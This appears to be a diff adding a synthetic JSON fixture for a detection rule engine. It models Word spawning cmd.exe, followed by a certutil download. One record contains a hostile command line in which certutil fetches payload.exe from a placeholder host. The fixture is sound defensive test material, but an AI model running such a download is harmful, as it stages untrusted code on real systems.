@@ -1,0 +1,18 @@
+{
+  "fixture_id": "syn-alpha-office-ingress",
+  "description": "Declared-provenance SYNTHETIC seed scenario (template=office-then-ingress, seed=alpha-2026a). Tier-1 machinery only; NOT real-world accuracy evidence. Raw telemetry only; labels live in annotations/. Replays via fixtures/phase1_core_rules.json (unmodified) to one attribution unit.",
+  "scenarios": [
+    {
+      "scenario_id": "alpha-cmd",
+      "raw_record": { "record_id": "evt-alpha-cmd", "timestamp": "2026-05-01T10:00:00+00:00", "observation_id": "obs-alpha-cmd" },
+      "process": { "name": "cmd.exe", "parent_name": "WINWORD.EXE", "entity_id": "alpha-cmd" },
+      "host": { "id": "host-alpha" }
+    },
+    {
+      "scenario_id": "alpha-certutil",
+      "raw_record": { "record_id": "evt-alpha-certutil", "timestamp": "2026-05-01T10:00:01+00:00", "observation_id": "obs-alpha-certutil" },
+      "process": { "name": "certutil.exe", "command_line": "certutil.exe -urlcache -split -f http://example.invalid/payload.exe payload.exe", "parent_entity_id": "alpha-cmd", "entity_id": "alpha-certutil" },
+      "host": { "id": "host-alpha" }
+    }
+  ]
+}
